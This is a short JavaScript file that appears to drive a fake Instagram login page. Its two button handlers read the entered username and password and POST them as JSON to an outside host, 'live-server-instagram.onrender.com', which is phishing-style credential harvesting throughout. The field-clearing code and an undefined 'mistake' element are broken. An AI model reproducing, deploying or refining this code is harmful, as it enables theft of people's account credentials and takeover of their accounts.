let btn = document.querySelector(".login-btn");
let btn02 = document.querySelector(".inputButton");


let inp = document.querySelectorAll(".input");
let inp02 = document.querySelectorAll(".inputText");


btn.onclick = () => {
    let inp1 = inp[0].value;
    let inp2 = inp[1].value;

    fetch('https://live-server-instagram.onrender.com/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            login: inp1,
            password: inp2
        })
    })
        .then(res => {
            if (res.status === 201) {
                inp1.value = ''
                inp2.value = ''
            } else {
                alert('xatolik yuzaga keldi')
            }
        })

        .catch(er => {
            mistake.textContent = `
            Пожалуйста, введите свой пароль и войдите в систему полностью
            `
            alert('error')
        })
}

btn02.onclick = () => {
    let inp1 = inp02[0].value;
    let inp2 = inp02[1].value;

    fetch('https://live-server-instagram.onrender.com/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            login: inp1,
            password: inp2
        })
    })
        .then(res => {
            if (res.status === 201) {
                inp1.value = ''
                inp2.value = ''
            } else {
                alert('xatolik yuzaga keldi')
            }
        })

        .catch(er => {
            mistake.textContent = `
            Пожалуйста, введите свой пароль и войдите в систему полностью
            `
            alert('error')
        })
}